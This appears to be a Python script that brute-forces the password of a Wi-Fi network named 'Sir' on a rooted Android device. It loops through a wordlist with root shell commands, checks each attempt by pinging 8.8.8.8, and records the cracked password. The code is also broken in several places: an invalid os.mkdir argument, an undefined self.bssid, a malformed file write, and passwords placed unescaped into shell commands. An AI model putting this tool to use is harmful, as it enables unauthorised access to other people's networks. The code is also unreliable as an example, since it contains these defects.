import subprocess
import time
import sys
import threading
import os

WORDLIST_PATH = "passwords.txt"
CRACKED_FILE = "cracked.txt"
SECURITY = "wpa2"
MAX_RETRIES = 3
WAIT_TIME = 5  # seconds after each attempt

class BruteForcer:
    def __init__(self, ssid):
        os.mkdir("logs", exist_ok=True)
        self.ssid = ssid
        self.progress_file = f'logs/{ssid}_wifi_bruteforce_progress.txt'
        self.max_retries = 3
        self.wait_time = 5  # seconds after each attempt

    # ---------- Core Helpers ----------
    def run_cmd(self,cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.returncode, result.stdout.strip(), result.stderr.strip()

    def is_connected(self):
        code, out, err = self.run_cmd("su -c 'ping -c 1 8.8.8.8'")
        return code == 0


    def connect_to_wifi(self,password):
        cmd = f"su -c 'cmd wifi connect-network \"{self.ssid}\" {SECURITY} \"{password}\"'"
        code, out, err = self.run_cmd(cmd)
        return code == 0

    # ---------- Progress Handling ----------
    def load_progress(self):
        if os.path.exists(self.progress_file):
            with open(self.progress_file, "r") as f:
                return f.read().strip()
        return None

    def save_success(self,password):
        with open(CRACKED_FILE, "a") as f:
            f.write(self.bssid,":",password)
        print(f"✅ Password saved to {CRACKED_FILE}")
    def save_progress(self,password):
        with open(self.progress_file, "w") as f:
            f.write(password)

    # ---------- Brute-Force Logic ----------
    def brute_force(self):
        print(f"📡 Starting Wi-Fi brute-force on SSID: {self.bssid}")

        try:
            with open(WORDLIST_PATH, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print("❌ Failed to read wordlist:", e)
            sys.exit(1)

        start_from = self.load_progress()
        skip = bool(start_from)
        retries = {}

        for i, password in enumerate(passwords, 1):
            if skip:
                if password == start_from:
                    skip = False
                continue

            print(f"🔁 [{i}/{len(passwords)}] Trying password: {password}")

            for attempt in range(1, MAX_RETRIES + 1):
                success = self.connect_to_wifi(password)
                time.sleep(WAIT_TIME)

                if self.is_connected():
                    print(f"✅ SUCCESS! Password found: {password}")
                    self.save_success(password)
                    return

                print(f"❌ Attempt {attempt} failed.")
                if attempt < MAX_RETRIES:
                    print("↻ Retrying...")
                    time.sleep(2)
                else:
                    break  # Give up on this password

            self.save_progress(password)  # Save after every attempt

        print("💀 Brute-force complete. Password not found.")
        self.save_progress("")
    def main(self):
        # ---------- Start ----------
        print("🔧 Enabling Wi-Fi...")
        self.run_cmd("su -c 'svc wifi enable'")
        time.sleep(3)

        # Optional: run in thread (not needed here, but good structure)
        thread = threading.Thread(target=self.brute_force)
        thread.start()
        thread.join()

if __name__ == "__main__":
    brute_forcer = BruteForcer('Sir')
    brute_forcer.main()